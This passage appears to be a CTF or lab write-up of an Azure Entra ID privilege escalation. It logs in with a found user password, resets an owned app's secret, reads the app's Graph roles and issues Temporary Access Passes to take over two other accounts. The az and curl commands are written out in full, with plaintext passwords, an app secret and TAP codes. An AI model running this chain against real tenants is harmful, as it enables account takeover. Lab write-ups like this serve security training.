Scanning the password with 3 suspected users. The password is belong to Gumby. Start to login to Gumby.

`az login -u gumby@201618.onmicrosoft.com -p 'D3l4w4r3R1v3r$#@!' --allow-no-subscriptions`
![Gumbylogin]<img width="1102" height="466" alt="image" src="https://github.com/user-attachments/assets/72b2fd12-2da4-4c9b-afe7-71dc2ec34407" />

So Gumby is the owner of the app so it can reset the password of app and login as app to check which permission we gain
`az ad app credential reset --id b126c695-541a-4174-b75d-7df2f1607d4b --append`

![Appreset]<img width="1091" height="179" alt="image" src="https://github.com/user-attachments/assets/e5c8b10a-9d74-47db-9082-135052892fa1" />

Take note of the app password so later, we can login as an app to check which role we have:
`az login --service-principal -u b126c695-541a-4174-b75d-7df2f1607d4b -p 'z7l8Q~4sIfhXqY25xSZ8MhmYnRK7AVS1nePRsbUY' --tenant a5e3d499-5220-48cf-b044-d2502184fd52 --allow-no-subscriptions`
![loginasanapp]<img width="1114" height="341" alt="image" src="https://github.com/user-attachments/assets/c3e92a73-c81f-42f3-a7c7-152ed98ae2ef" />

Searching for the right of the app
```
TOKEN=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)
echo $TOKEN | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq '.roles'
```

![Apppermission]
<img width="1107" height="443" alt="image" src="https://github.com/user-attachments/assets/e4c4335e-0250-4cf9-bfba-ec35a5a165b5" />

We find out that, the app has permission to modify the authentication method so we can use it to set TAP for Goo and Pokey so we can gain the access to VM to look for the flag.

To do that, we need to record the Object ID of Goo and Pockey and set it as $TARGET: 

Goo
`TARGET=7717c55c-b08c-46d8-89e8-8ab42cb2c265`
```
curl -s -X POST \ -H "Authorization: Bearer $TOKEN" \ -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/users/$TARGET/authentication/temporaryAccessPassMethods" \
  -d '{"lifetimeInMinutes":60,"isUsableOnce":false}' | jq
```
![GOOTAP] <img width="1096" height="442" alt="image" src="https://github.com/user-attachments/assets/f80accd8-458b-47fc-b552-d1278c6f4817" />

Reset the var $TARGET to Pokey ObjectID=552fafa5-4564-41f7-8b58-41da31d7a990 and run same command as for Goo to set TAP for Pokey

![PokeyTAP]<img width="1099" height="440" alt="image" src="https://github.com/user-attachments/assets/ab8e982d-eca6-4b5b-89c4-9585bb92c5fa" />

Now, we have 

Goo | goo@201618.onmicrosoft.com | 96$ydDEdQ2rqnq3A |

Pokey | pokey@201618.onmicrosoft.com | 3TS85fskeP^$Nj=- |

Now, we can start to login to Azure portal on web. Check Goo.md and Pockey.md to see how we can gain access from them



